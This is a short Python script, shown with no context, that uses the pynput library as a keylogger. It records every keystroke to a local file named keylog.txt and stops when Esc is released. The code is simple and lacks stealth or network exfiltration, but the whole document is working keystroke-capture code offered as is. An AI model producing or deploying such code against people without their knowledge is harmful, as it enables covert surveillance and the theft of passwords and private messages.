from pynput.keyboard import Key, Listener

def on_press(key):
    with open("keylog.txt", "a") as log_file:
        log_file.write(str(key) + "\n")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

